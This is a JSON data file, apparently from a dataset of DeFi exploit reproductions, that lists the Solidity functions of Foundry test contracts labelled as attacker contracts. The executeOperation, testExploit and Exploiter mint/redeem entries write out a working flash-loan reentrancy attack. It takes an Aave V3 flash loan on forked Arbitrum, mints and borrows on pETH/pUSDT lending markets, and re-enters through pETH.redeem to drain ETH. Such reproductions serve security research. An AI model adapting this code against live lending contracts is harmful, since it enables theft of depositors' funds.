[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        USDT.approve(address(aaveV3), type(uint256).max);\n        WETH.approve(address(aaveV3), type(uint256).max);\n        USDT.approve(address(pUSDT), type(uint256).max);\n        WBTC.approve(address(pWBTC), type(uint256).max);\n\n        exploiter = new Exploiter();\n        WETH.transfer(address(exploiter), 100 * 1e18);\n        cheats.label(address(exploiter), \"exploiter\");\n        exploiter.mint();\n\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        payable(address(pETH)).call{value: address(this).balance}(\"\");\n        pUSDT.mint(USDT.balanceOf(address(this)));\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = address(pETH);\n        cTokens[1] = address(pUSDT);\n        unitroller.enterMarkets(cTokens);\n        pETH.borrow(13_075_471_156_463_824_220);\n        pETH.redeem(pETH.balanceOf(address(this))); // Reentrancy enter point\n\n        exploiter.redeem();\n        payable(address(WETH)).call{value: address(this).balance}(\"\");\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 79_308_097);\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(pUSDT), \"pUSDT\");\n        cheats.label(address(pETH), \"pETH\");\n        cheats.label(address(pWBTC), \"pWBTC\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(curvePool), \"curvePool\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        payable(address(0)).transfer(address(this).balance);\n        address[] memory assets = new address[](2);\n        assets[0] = address(WETH);\n        assets[1] = address(USDT);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 200 * 1e18;\n        amounts[1] = 30_000 * 1e6;\n        uint256[] memory modes = new uint256[](2);\n        modes[0] = 0;\n        modes[1] = 0;\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n        exchangeUSDTWBTC();\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploiter",
    "source_type": "attacker_contract",
    "function_name": "mint",
    "original_code": "    function mint() external payable {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        payable(address(pETH)).call{value: address(this).balance}(\"\");\n",
    "description": ""
  },
  {
    "contract/interface": "Exploiter",
    "source_type": "attacker_contract",
    "function_name": "redeem",
    "original_code": "    function redeem() external payable {\n        pETH.redeem(pETH.balanceOf(address(this)));\n        payable(address(WETH)).call{value: address(this).balance}(\"\");\n        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  }
]